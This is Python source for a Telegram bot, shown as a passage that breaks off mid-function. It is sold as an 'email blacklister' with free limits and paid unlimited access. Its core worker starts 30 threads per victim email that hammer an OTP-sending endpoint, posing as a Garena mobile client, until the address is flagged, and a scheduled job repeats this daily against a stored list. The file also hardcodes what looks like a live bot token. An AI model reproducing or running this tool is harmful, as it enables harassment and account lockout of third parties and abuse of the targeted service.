import os
import sys
import time
import threading
import requests
import urllib3
import json
import asyncio
from datetime import datetime

# Set timezone
os.environ['TZ'] = 'Asia/Kolkata'
try:
    time.tzset()
except AttributeError:
    pass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Telegram imports
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.request import HTTPXRequest
from telegram.error import Conflict, NetworkError, TimedOut

# Colors for terminal
C = "\033[1;36m"
G = "\033[1;32m"
R = "\033[1;31m"
Y = "\033[1;33m"
W = "\033[1;37m"
B = "\033[1m"
S = "\033[0m"

print(f"{G}[+] Bot is starting...{S}")

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8947082460:AAHOdsfA0mFOx-1s4otYwrRuNCR9kYtMw9M"
OWNER_USERNAME = "@CURRENTTTTTTTT"
OWNER_ID = 6863389453

# Admin list
ADMIN_FILE = "admins.json"
BANNED_FILE = "banned_users.json"
SUBSCRIBER_FILE = "subscribers.json"

# FORCE CHANNEL
FORCE_CHANNEL_USERNAME = "@Adityaapis_570"
FORCE_CHANNEL_LINK = "https://t.me/Adityaapis_570"

# Auto Blacklist Settings
AUTO_BLACKLIST_FILE = "auto_emails.json"
BROADCAST_FILE = "users.json"

# Threads
NUM_WORKERS = 30
MAX_BLACKLIST_LIMIT = 2

# Global variables
any_success_lock = threading.Lock()
any_success = False
error_event = threading.Event()
stop_event = threading.Event()
error_print_lock = threading.Lock()
generation = 0
user_states = {}
auto_emails_list = []
users_list = []
admins_list = []
banned_users_list = []
subscribers_list = []

print(f"{G}[+] Global variables initialized{S}")

# ==================== BANNED USERS FUNCTIONS ====================

def load_banned_users():
    global banned_users_list
    try:
        if os.path.exists(BANNED_FILE):
            with open(BANNED_FILE, 'r') as f:
                banned_users_list = json.load(f)
            print(f"{G}[+] Loaded {len(banned_users_list)} banned users{S}")
        else:
            banned_users_list = []
            save_banned_users()
    except Exception as e:
        print(f"{R}[!] Error loading banned users: {e}{S}")
        banned_users_list = []

def save_banned_users():
    try:
        with open(BANNED_FILE, 'w') as f:
            json.dump(banned_users_list, f, indent=4)
        print(f"{G}[+] Saved {len(banned_users_list)} banned users{S}")
    except Exception as e:
        print(f"{R}[!] Error saving banned users: {e}{S}")

def is_user_banned(user_id):
    return user_id in banned_users_list

def ban_user(user_id):
    global banned_users_list
    if user_id == OWNER_ID:
        return False, "Cannot ban the owner!"
    if is_admin(user_id):
        return False, "Cannot ban an admin!"
    if user_id in banned_users_list:
        return False, "User is already banned!"
    banned_users_list.append(user_id)
    save_banned_users()
    return True, "User banned successfully!"

def unban_user(user_id):
    global banned_users_list
    if user_id not in banned_users_list:
        return False, "User is not banned!"
    banned_users_list.remove(user_id)
    save_banned_users()
    return True, "User unbanned successfully!"

# ==================== ADMIN FUNCTIONS ====================

def load_admins():
    global admins_list
    try:
        if os.path.exists(ADMIN_FILE):
            with open(ADMIN_FILE, 'r') as f:
                admins_list = json.load(f)
            print(f"{G}[+] Loaded {len(admins_list)} admins{S}")
        else:
            admins_list = []
            save_admins()
    except Exception as e:
        print(f"{R}[!] Error loading admins: {e}{S}")
        admins_list = []

def save_admins():
    try:
        with open(ADMIN_FILE, 'w') as f:
            json.dump(admins_list, f, indent=4)
        print(f"{G}[+] Saved {len(admins_list)} admins{S}")
    except Exception as e:
        print(f"{R}[!] Error saving admins: {e}{S}")

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    return user_id in admins_list

# ==================== SUBSCRIBER FUNCTIONS (NEW) ====================

def load_subscribers():
    global subscribers_list
    try:
        if os.path.exists(SUBSCRIBER_FILE):
            with open(SUBSCRIBER_FILE, 'r') as f:
                subscribers_list = json.load(f)
            print(f"{G}[+] Loaded {len(subscribers_list)} subscribers{S}")
        else:
            subscribers_list = []
            save_subscribers()
    except Exception as e:
        print(f"{R}[!] Error loading subscribers: {e}{S}")
        subscribers_list = []

def save_subscribers():
    try:
        with open(SUBSCRIBER_FILE, 'w') as f:
            json.dump(subscribers_list, f, indent=4)
        print(f"{G}[+] Saved {len(subscribers_list)} subscribers{S}")
    except Exception as e:
        print(f"{R}[!] Error saving subscribers: {e}{S}")

def is_subscribed(user_id):
    return user_id in subscribers_list

def subscribe_user(user_id):
    global subscribers_list
    if user_id == OWNER_ID:
        return False, "Owner already has unlimited access!"
    if is_admin(user_id):
        return False, "Admins already have unlimited access!"
    if user_id in subscribers_list:
        return False, "User is already subscribed!"
    subscribers_list.append(user_id)
    save_subscribers()
    return True, "Subscription added successfully! User now has unlimited access."

def unsubscribe_user(user_id):
    global subscribers_list
    if user_id not in subscribers_list:
        return False, "User is not subscribed!"
    subscribers_list.remove(user_id)
    save_subscribers()
    return True, "Subscription removed successfully!"

def has_unlimited_access(user_id):
    return is_admin(user_id) or is_subscribed(user_id)

# ==================== USER LIST FUNCTIONS ====================

def load_users():
    global users_list
    try:
        if os.path.exists(BROADCAST_FILE):
            with open(BROADCAST_FILE, 'r') as f:
                users_list = json.load(f)
            print(f"{G}[+] Loaded {len(users_list)} users for broadcast{S}")
        else:
            users_list = []
            save_users()
    except Exception as e:
        print(f"{R}[!] Error loading users: {e}{S}")
        users_list = []

def save_users():
    try:
        with open(BROADCAST_FILE, 'w') as f:
            json.dump(users_list, f, indent=4)
        print(f"{G}[+] Saved {len(users_list)} users{S}")
    except Exception as e:
        print(f"{R}[!] Error saving users: {e}{S}")

def add_user(user_id, username, full_name):
    global users_list
    if user_id is None:
        return False
    for user in users_list:
        if user['id'] == user_id:
            return False
    
    users_list.append({
        'id': user_id,
        'username': username if username else 'N/A',
        'name': full_name if full_name else 'Unknown',
        'joined': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'blacklist_count': 0
    })
    save_users()
    return True

def is_new_user(user_id):
    for user in users_list:
        if user['id'] == user_id:
            return False
    return True

def get_user_blacklist_count(user_id):
    for user in users_list:
        if user['id'] == user_id:
            return user.get('blacklist_count', 0)
    return 0

def increment_blacklist_count(user_id):
    for user in users_list:
        if user['id'] == user_id:
            user['blacklist_count'] = user.get('blacklist_count', 0) + 1
            save_users()
            return True
    return False

def find_user_by_id(user_id):
    for user in users_list:
        if user['id'] == user_id:
            return user
    return None

print(f"{G}[+] User functions loaded{S}")

# ==================== AUTO BLACKLIST FUNCTIONS ====================

def load_auto_emails():
    global auto_emails_list
    try:
        if os.path.exists(AUTO_BLACKLIST_FILE):
            with open(AUTO_BLACKLIST_FILE, 'r') as f:
                auto_emails_list = json.load(f)
            print(f"{G}[+] Loaded {len(auto_emails_list)} auto blacklist emails{S}")
        else:
            auto_emails_list = []
            save_auto_emails()
    except Exception as e:
        print(f"{R}[!] Error loading emails: {e}{S}")
        auto_emails_list = []

def save_auto_emails():
    try:
        with open(AUTO_BLACKLIST_FILE, 'w') as f:
            json.dump(auto_emails_list, f, indent=4)
        print(f"{G}[+] Saved {len(auto_emails_list)} emails{S}")
    except Exception as e:
        print(f"{R}[!] Error saving emails: {e}{S}")

def worker(email, gen):
    global any_success
    while not stop_event.is_set():
        if gen != generation:
            return
        url = "https://swap-otp-sender.vercel.app/send"
        headers = {
            "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        data = {
            "app_id": "100067",
            "email": email,
            "locale": "en_HK"
        }

        try:
            resp = requests.post(url, headers=headers, data=data, timeout=15)
            if resp.status_code == 200:
                with any_success_lock:
                    any_success = True
            else:
                with error_print_lock:
                    if not error_event.is_set():
                        error_event.set()
                        stop_event.set()
                return
        except Exception as e:
            with error_print_lock:
                if not error_event.is_set():
                    error_event.set()
                    stop_event.set()
            return

def wait_for_error():
    stop_event.wait()

def blacklist_email(email):
    global any_success, error_event, stop_event, generation
    
    generation += 1
    any_success = False
    error_event.clear()
    stop_event.clear()
    
    threads = []
    for _ in range(NUM_WORKERS):
        t = threading.Thread(target=worker, args=(email, generation))
        t.daemon = True
        t.start()
        threads.append(t)
    
    wait_for_error()
    
    if error_event.is_set():
        if not any_success:
            return False, "🔴 EMAIL ALREADY BLACKLISTED"
        else:
            return True, "🟢 EMAIL BLACKLISTED SUCCESSFULLY"
    return False, "⚠️ UNKNOWN ERROR OCCURRED"

print(f"{G}[+] Blacklist functions loaded{S}")

# ==================== AUTO BLACKLIST JOB (FIXED) ====================

async def auto_blacklist_job(context: ContextTypes.DEFAULT_TYPE):
    global any_success, error_event, stop_event, generation
    
    print(f"{G}[+] Auto blacklist job triggered at {datetime.now().strftime('%H:%M:%S')}{S}")
    
    if not auto_emails_list:
        print(f"{Y}[!] No emails in auto blacklist{S}")
        if OWNER_ID:
            try:
                await context.bot.send_message(
                    chat_id=OWNER_ID,
                    text=f"🤖 AUTO BLACKLIST\n\n⚠️ No emails in auto list!\nTime: {datetime.now().strftime('%I:%M %p')}"
                )
            except Exception as e:
                print(f"{R}[!] Failed to notify owner: {e}{S}")
        return
    
    if OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"🤖 AUTO BLACKLIST STARTED\n\nTotal emails: {len(auto_emails_list)}\nTime: {datetime.now().strftime('%I:%M %p')}"
            )
        except Exception as e:
            print(f"{R}[!] Failed to notify owner: {e}{S}")
    
    results = {"success": 0, "failed": 0, "skipped": 0, "total": len(auto_emails_list)}
    
    # Copy list to avoid mutation during iteration
    emails_to_process = list(auto_emails_list)
    
    for email in emails_to_process:
        print(f"{C}[+] Auto blacklisting: {email}{S}")
        
        any_success = False
        error_event.clear()
        stop_event.clear()
        generation += 1
        
        threads = []
        for _ in range(NUM_WORKERS):
            t = threading.Thread(target=worker, args=(email, generation))
            t.daemon = True
            t.start()
            threads.append(t)
        
        wait_for_error()
        
        if any_success:
            results["success"] += 1
            print(f"{G}[+] Success: {email}{S}")
        elif error_event.is_set():
            results["skipped"] += 1
            print(f"{Y}[!] Skipped (already blacklisted): {email}{S}")
        else:
            results["failed"] += 1
            print(f"{R}[!] Failed: {email}{S}")
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=2)
        
        time.sleep(2)
    
    if OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"""✅ AUTO BLACKLIST COMPLETE

Results:
Total: {results['total']}
Success: {results['success']}
Failed: {results['failed']}
Skipped (Already Blacklisted): {results['skipped']}

Time: {datetime.now().strftime('%I:%M %p')}
Date: {datetime.now().strftime('%d-%m-%Y')}"""
            )
        except Exception as e:
            print(f"{R}[!] Failed to notify owner: {e}{S}")
    
    print(f"{G}[+] Auto blacklist complete: {results}{S}")

# ==================== BAN/UNBAN COMMANDS ====================

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user is None:
        await update.message.reply_text("❌ Error: Could not identify user.")
        return
    
    if not is_admin(user.id):
        await update.message.reply_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "🚫 BAN USER\n\nUsage: /ban <user_id>\n\nExample: /ban 123456789\n\nBan a user from using the bot."
        )
        return
    
    try:
        target_id = int(context.args[0])
        success, msg = ban_user(target_id)
        
        if success:
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=f"🚫 YOU HAVE BEEN BANNED!\n\nYou are no longer allowed to use this bot.\n\nContact: {OWNER_USERNAME}"
                )
            except Exception as e:
                print(f"{R}[!] Failed to notify banned user: {e}{S}")
            
            await update.message.reply_text(f"✅ {msg}")
        else:
            await update.message.reply_text(f"❌ {msg}")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID! Please send a valid number.")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user is None:
        await update.message.reply_text("❌ Error: Could not identify user.")
        return
    
    if not is_admin(user.id):
        await update.message.reply_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "✅ UNBAN USER\n\nUsage: /unban <user_id>\n\nExample: /unban 123456789\n\nUnban a user from using the bot."
        )
        return
    
    try:
        target_id = int(context.args[0])
        success, msg = unban_user(target_id)
        
        if success:
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=f"✅ YOU HAVE BEEN UNBANNED!\n\nYou can now use the bot again.\n\nContact: {OWNER_USERNAME}"
                )
            except Exception as e:
                print(f"{R}[!] Failed to notify unbanned user: {e}{S}")
            
            await update.message.reply_text(f"✅ {msg}")
        else:
            await update.message.reply_text(f"❌ {msg}")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID! Please send a valid number.")

async def banned_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user is None:
        await update.message.reply_text("❌ Error: Could not identify user.")
        return
    
    if not is_admin(user.id):
        await update.message.reply_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this command!")
        return
    
    if not banned_users_list:
        await update.message.reply_text("📋 BANNED USERS\n\nNo users are banned.")
        return
    
    banned_text = "\n".join([f"• ID: {uid}" for uid in banned_users_list])
    await update.message.reply_text(
        f"📋 BANNED USERS\n\n{banned_text}\n\nTotal: {len(banned_users_list)} users"
    )

# ==================== SUBSCRIPTION COMMANDS (NEW) ====================

async def subscribe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user is None:
        await update.message.reply_text("❌ Error: Could not identify user.")
        return
    
    # Only owner can subscribe
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ ACCESS DENIED\n\n❌ Only the OWNER can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "💎 SUBSCRIBE USER\n\n"
            "Usage: /subscribe <user_id>\n\n"
            "Example: /subscribe 123456789\n\n"
            "This gives the user UNLIMITED blacklist access.\n\n"
            "Related Commands:\n"
            "• /unsubscribe <user_id> - Remove subscription\n"
            "• /checksub <user_id> - Check subscription status\n"
            "• /sublist - View all subscribers"
        )
        return
    
    try:
        target_id = int(context.args[0])
        success, msg = subscribe_user(target_id)
        
        if success:
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=f"""💎 SUBSCRIPTION ACTIVATED!

🎉 Congratulations!
You now have UNLIMITED blacklist access!

✅ No more limits
✅ Unlimited email blacklisting
✅ Priority support

Contact: {OWNER_USERNAME}"""
                )
            except Exception as e:
                print(f"{R}[!] Failed to notify subscribed user: {e}{S}")
            
            await update.message.reply_text(f"✅ {msg}")
        else:
            await update.message.reply_text(f"❌ {msg}")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID! Please send a valid number.")

async def unsubscribe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user is None:
        await update.message.reply_text("❌ Error: Could not identify user.")
        return
    
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ ACCESS DENIED\n\n❌ Only the OWNER can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ UNSUBSCRIBE USER\n\nUsage: /unsubscribe <user_id>\n\nExample: /unsubscribe 123456789"
        )
        return
    
    try:
        target_id = int(context.args[0])
        success, msg = unsubscribe_user(target_id)
        
        if success:
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=f"❌ SUBSCRIPTION REMOVED\n\nYour unlimited access has been removed.\n\nContact: {OWNER_USERNAME}"
                )
            except Exception as e:
                print(f"{R}[!] Failed to notify unsubscribed user: {e}{S}")
            
            await update.message.reply_text(f"✅ {msg}")
        else:
            await update.message.reply_text(f"❌ {msg}")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID! Please send a valid number.")

async def checksub_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user is None:
        await update.message.reply_text("❌ Error: Could not identify user.")
        return
    
    # If owner and args given, check that user. Otherwise check self.
    if context.args:
        if user.id != OWNER_ID:
            await update.message.reply_text("⛔ ACCESS DENIED\n\n❌ Only the OWNER can check other users' subscription!")
            return
        try:
            target_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ Invalid User ID!")
            return
    else:
        target_id = user.id
    
    is_sub = is_subscribed(target_id)
    is_adm = is_admin(target_id)
    
    if target_id == OWNER_ID:
        status = "👑 OWNER (Unlimited)"
    elif is_adm:
        status = "🛡️ ADMIN (Unlimited)"
    elif is_sub:
        status = "💎 SUBSCRIBED (Unlimited)"
    else:
        count = get_user_blacklist_count(target_id)
        remaining = MAX_BLACKLIST_LIMIT - count
        status = f"👤 NORMAL USER\n\nUsed: {count}/{MAX_BLACKLIST_LIMIT}\nRemaining: {remaining}"
    
    await update.message.reply_text(
        f"📊 SUBSCRIPTION STATUS\n\nUser ID: {target_id}\nStatus: {status}"
    )

async def sublist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user is None:
        await update.message.reply_text("❌ Error: Could not identify user.")
        return
    
    if not is_admin(user.id):
        await update.message.reply_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this command!")
        return
    
    if not subscribers_list:
        await update.message.reply_text("💎 SUBSCRIBERS LIST\n\nNo subscribers yet.")
        return
    
    subs_text = "\n".join([f"• ID: {sid}" for sid in subscribers_list])
    await update.message.reply_text(
        f"💎 SUBSCRIBERS LIST\n\n{subs_text}\n\nTotal: {len(subscribers_list)} subscribers"
    )

# ==================== BROADCAST COMMANDS ====================

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user is None:
        await update.message.reply_text("❌ Error: Could not identify user.")
        return
    
    if not is_admin(user.id):
        await update.message.reply_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "📢 BROADCAST\n\nUsage: /broadcast <message>\n\nExample: /broadcast Hello everyone!"
        )
        return
    
    broadcast_msg = ' '.join(context.args)
    
    keyboard = [
        [InlineKeyboardButton("✅ YES, SEND", callback_data='broadcast_yes')],
        [InlineKeyboardButton("❌ NO, CANCEL", callback_data='broadcast_no')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"📢 BROADCAST PREVIEW\n\nMessage: {broadcast_msg}\n\nTotal Users: {len(users_list)}\n\n⚠️ This will send message to ALL users!\n\nAre you sure?",
        reply_markup=reply_markup
    )
    
    context.user_data['broadcast_msg'] = broadcast_msg

async def broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    
    if user is None:
        await query.edit_message_text("❌ Error: Could not identify user.")
        return
    
    if not is_admin(user.id):
        await query.edit_message_text("⛔ ACCESS DENIED")
        return
    
    data = query.data
    broadcast_msg = context.user_data.get('broadcast_msg', '')
    
    if data == 'broadcast_yes':
        await query.edit_message_text("📢 BROADCAST STARTED\n\nSending message to all users...")
        
        success_count = 0
        fail_count = 0
        
        for user_data in users_list:
            if is_user_banned(user_data['id']):
                continue
            try:
                await context.bot.send_message(
                    chat_id=user_data['id'],
                    text=f"📢 BROADCAST MESSAGE\n\n{broadcast_msg}\n\n👑 From: {OWNER_USERNAME}"
                )
                success_count += 1
                await asyncio.sleep(0.1)
            except Exception as e:
                fail_count += 1
                print(f"{R}[!] Failed to send to {user_data['id']}: {e}{S}")
        
        await query.edit_message_text(
            f"✅ BROADCAST COMPLETE\n\n✅ Sent: {success_count} users\n❌ Failed: {fail_count} users\n📌 Total: {len(users_list)} users"
        )
        
    elif data == 'broadcast_no':
        await query.edit_message_text("❌ BROADCAST CANCELLED\n\nBroadcast has been cancelled.")

# ==================== BOT HANDLERS ====================

def get_main_menu_keyboard(user_id):
    if is_admin(user_id):
        keyboard = [
            [InlineKeyboardButton("✅ BLACKLIST NOW", callback_data='blacklist')],
            [InlineKeyboardButton("📂 ADD AUTO BLACKLIST", callback_data='add_auto')],
            [InlineKeyboardButton("📁 VIEW AUTO LIST", callback_data='view_auto')],
            [InlineKeyboardButton("🏠 CLEAR AUTO LIST", callback_data='clear_auto')],
            [InlineKeyboardButton("❌ REMOVE FROM AUTO", callback_data='remove_auto')],
            [InlineKeyboardButton("🔗 BROADCAST", callback_data='broadcast')],
            [InlineKeyboardButton("📱 USERS", callback_data='users')],
            [InlineKeyboardButton("🚫 BAN USER", callback_data='ban')],
            [InlineKeyboardButton("✅ UNBAN USER", callback_data='unban')],
            [InlineKeyboardButton("📋 BANNED LIST", callback_data='bannedlist')],
            [InlineKeyboardButton("💎 SUBSCRIBERS", callback_data='sublist')],
            [InlineKeyboardButton("📊 HELP & GUIDE", callback_data='help')],
            [InlineKeyboardButton("👤 OWNER", callback_data='owner')],
            [InlineKeyboardButton("📋 STATUS", callback_data='status')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
        ]
    elif is_subscribed(user_id):
        keyboard = [
            [InlineKeyboardButton("✅ BLACKLIST NOW", callback_data='blacklist')],
            [InlineKeyboardButton("💎 SUBSCRIBED - UNLIMITED", callback_data='mylimit')],
            [InlineKeyboardButton("📊 HELP & GUIDE", callback_data='help')],
            [InlineKeyboardButton("👤 OWNER", callback_data='owner')],
            [InlineKeyboardButton("📋 STATUS", callback_data='status')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
        ]
    else:
        count = get_user_blacklist_count(user_id)
        keyboard = [
            [InlineKeyboardButton("✅ BLACKLIST NOW", callback_data='blacklist')],
            [InlineKeyboardButton(f"📊 LIMIT: {count}/{MAX_BLACKLIST_LIMIT}", callback_data='mylimit')],
            [InlineKeyboardButton("📊 HELP & GUIDE", callback_data='help')],
            [InlineKeyboardButton("👤 OWNER", callback_data='owner')],
            [InlineKeyboardButton("📋 STATUS", callback_data='status')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
        ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        if user is None:
            await update.message.reply_text("❌ Error: Could not identify user.")
            return
        
        user_id = user.id
        
        if is_user_banned(user_id):
            await update.message.reply_text(
                f"🚫 YOU ARE BANNED!\n\nYou are not allowed to use this bot.\n\nContact: {OWNER_USERNAME}"
            )
            return
        
        user_states[user_id] = "idle"
        
        is_new = is_new_user(user_id)
        add_user(user_id, user.username, user.full_name)
        
        is_member = await check_channel_membership(context, user_id)
        
        if user_id != OWNER_ID and not is_member:
            await send_force_channel_message(update, context)
            return
        
        if is_new:
            await notify_owner_new_user(context, user)
        
        reply_markup = get_main_menu_keyboard(user_id)
        
        if user_id == OWNER_ID:
            welcome_text = f"""✨🌟 EMAIL BLACKLISTER 🌟✨

👑 Welcome {user.full_name if user.full_name else 'User'}! (OWNER)

🎯 Your Ultimate Blacklist Tool

📌 Auto Blacklist:
⏰ Daily at 4:10 AM
📧 Add emails to auto list

👑 Owner: {OWNER_USERNAME}
💬 Support: 24/7 Available"""
        elif is_admin(user_id):
            welcome_text = f"""✨🌟 EMAIL BLACKLISTER 🌟✨

🛡️ Welcome {user.full_name if user.full_name else 'User'}! (ADMIN)

🎯 Your Ultimate Blacklist Tool

📌 Auto Blacklist:
⏰ Daily at 4:10 AM
📧 Add emails to auto list

👑 Owner: {OWNER_USERNAME}
💬 Support: 24/7 Available"""
        elif is_subscribed(user_id):
            welcome_text = f"""✨🌟 EMAIL BLACKLISTER 🌟✨

💎 Welcome {user.full_name if user.full_name else 'User'}! (SUBSCRIBED)

🎯 Your Ultimate Blacklist Tool

💎 Status: UNLIMITED ACCESS
✅ No limits on blacklisting

📌 Auto Blacklist:
⏰ Daily at 4:10 AM
📧 Add emails to auto list

👑 Owner: {OWNER_USERNAME}
💬 Support: 24/7 Available"""
        else:
            count = get_user_blacklist_count(user_id)
            remaining = MAX_BLACKLIST_LIMIT - count
            welcome_text = f"""✨🌟 EMAIL BLACKLISTER 🌟✨

🌟 Welcome {user.full_name if user.full_name else 'User'}!
🎯 Your Ultimate Blacklist Tool

📊 Your Limit: {count}/{MAX_BLACKLIST_LIMIT}
📌 Remaining: {remaining}

💎 Want unlimited access?
Contact: {OWNER_USERNAME}

📌 Auto Blacklist:
⏰ Daily at 4:10 AM
📧 Add emails to auto list

👑 Owner: {OWNER_USERNAME}
💬 Support: 24/7 Available"""
        
        await update.message.reply_text(welcome_text, reply_markup=reply_markup)
    except Exception as e:
        print(f"{R}[!] Error in start: {e}{S}")
        await update.message.reply_text("❌ An error occurred. Please try again.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        
        user = update.effective_user
        if user is None:
            await query.edit_message_text("❌ Error: Could not identify user.")
            return
        
        user_id = user.id
        
        if is_user_banned(user_id):
            await query.edit_message_text("🚫 YOU ARE BANNED!\n\nYou are not allowed to use this bot.")
            return
        
        data = query.data
        
        if user_id != OWNER_ID:
            is_member = await check_channel_membership(context, user_id)
            if not is_member:
                await send_force_channel_message_update(query)
                return
        
        if data == 'blacklist':
            if not has_unlimited_access(user_id):
                count = get_user_blacklist_count(user_id)
                if count >= MAX_BLACKLIST_LIMIT:
                    await query.edit_message_text(
                        f"❌ LIMIT REACHED!\n\nYou have already blacklisted {count} emails.\nMaximum limit: {MAX_BLACKLIST_LIMIT}\n\n💎 Want unlimited access?\nContact: {OWNER_USERNAME}"
                    )
                    return
            
            user_states[user_id] = "awaiting_email"
            keyboard = [
                [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                f"📧 ENTER EMAIL ADDRESS\n\n{user.full_name if user.full_name else 'User'}, please enter the email you want to blacklist\n\nExample: user@example.com\n\nClick CANCEL to stop",
                reply_markup=reply_markup
            )
        
        elif data == 'mylimit':
            if is_admin(user_id):
                await query.edit_message_text(
                    "📊 YOUR ACCESS\n\n🛡️ ADMIN - Unlimited access!\n\nYou can blacklist unlimited emails."
                )
            elif is_subscribed(user_id):
                count = get_user_blacklist_count(user_id)
                await query.edit_message_text(
                    f"📊 YOUR ACCESS\n\n💎 SUBSCRIBED - Unlimited access!\n\nBlacklists used: {count}\n\nNo limits!"
                )
            else:
                count = get_user_blacklist_count(user_id)
                remaining = MAX_BLACKLIST_LIMIT - count
                await query.edit_message_text(
                    f"📊 YOUR LIMIT\n\nUsed: {count}/{MAX_BLACKLIST_LIMIT}\nRemaining: {remaining}\n\nFailed attempts don't count!\n\n💎 Want unlimited access?\nContact: {OWNER_USERNAME}"
                )
        
        elif data == 'add_auto':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this feature!")
                return
            
            user_states[user_id] = "awaiting_auto_email"
            keyboard = [
                [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "📧 ADD AUTO BLACKLIST\n\nSend email(s) to add to auto blacklist.\n\nFormat:\nSingle: user@example.com\nMultiple: email1@x.com, email2@x.com\n\nWill blacklist daily at 4:10 AM",
                reply_markup=reply_markup
            )
        
        elif data == 'remove_auto':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this feature!")
                return
            
            user_states[user_id] = "awaiting_remove_email"
            keyboard = [
                [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ REMOVE FROM AUTO BLACKLIST\n\nSend email(s) to remove from auto blacklist.\n\nFormat:\nSingle: user@example.com\nMultiple: email1@x.com, email2@x.com\n\nWill remove from auto list",
                reply_markup=reply_markup
            )
        
        elif data == 'view_auto':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this feature!")
                return
            
            if auto_emails_list:
                email_list = "\n".join([f"• {email}" for email in auto_emails_list])
                text = f"📋 AUTO BLACKLIST LIST\n\nTotal: {len(auto_emails_list)} emails\n\nEmails:\n{email_list}\n\nTime: Daily 4:10 AM"
            else:
                text = "📋 AUTO BLACKLIST LIST\n\nNo emails in auto blacklist\n\nAdd emails using: ADD AUTO BLACKLIST"
            
            keyboard = [
                [InlineKeyboardButton("🔙 BACK", callback_data='back')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(text, reply_markup=reply_markup)
        
        elif data == 'clear_auto':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this feature!")
                return
            
            auto_emails_list.clear()
            save_auto_emails()
            
            keyboard = [
                [InlineKeyboardButton("🔙 BACK", callback_data='back')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text("🗑️ AUTO LIST CLEARED\n\nAll emails removed from auto blacklist!", reply_markup=reply_markup)
        
        elif data == 'broadcast':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this feature!")
                return
            
            await query.edit_message_text(
                f"📢 BROADCAST\n\nSend message to all users.\n\nTotal Users: {len(users_list)}\n\nUsage: /broadcast <message>\n\nExample: /broadcast Hello everyone!"
            )
        
        elif data == 'users':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this feature!")
                return
            
            if not users_list:
                await query.edit_message_text("📊 USERS LIST\n\nNo users found.")
                return
            
            user_text = "\n".join([f"• {u['name']} (@{u['username']}) - {u.get('blacklist_count', 0)}/{MAX_BLACKLIST_LIMIT}" for u in users_list[-10:]])
            
            await query.edit_message_text(
